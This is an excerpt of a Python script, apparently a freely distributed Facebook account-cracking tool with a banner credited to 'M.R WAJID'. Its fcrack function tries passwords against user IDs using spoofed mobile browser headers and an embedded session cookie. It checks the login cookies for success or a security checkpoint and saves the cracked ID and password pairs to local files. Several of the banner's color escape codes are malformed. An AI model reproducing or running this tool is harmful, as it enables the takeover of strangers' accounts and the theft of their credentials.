...
##  ##  ## ######### ##    ##  ##  ##     ## 
##  ##  ## ##     ## ##    ##  ##  ##     ## 
 ###  ###  ##     ##  ######  #### ########  \033[1;32m WAJID\059[1;37m 
-------------------------------------------------
[•]CREATED BY     : \034[M.R WAJID\033[1;37m
[•]FACEBOOK       : \032[M.R WAJID\033[1;37m
[•]YOUTUBE        : \033[KING WAJID\033[1;37m
[•]STATUS         : \031[1;32mFREE\033[1;37m
--------------------------------------------------
...
def fcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=MSILZcNh0671SVf5sj_P4msW; sb=MSILZRbc8ldhTgYyMmzgZrM2; m_pixel_ratio=2; locale=en_US; wl_cbv=v2%3Bclient_version%3A2325%3Btimestamp%3A1695228575; vpd=v1%3B560x360x2; wd=360x560; fr=0RBM7vUcwJTJn9qn0.AWW2GK_RhW2Br1GzmVvae-3ecbo.BlCyIx.p_.AAA.0.0.BlCyL-.AWWgtwAYCII',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"itel L5002P"',
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                open('WAJID-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[WAJID-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('WAJID-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mWAJID\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
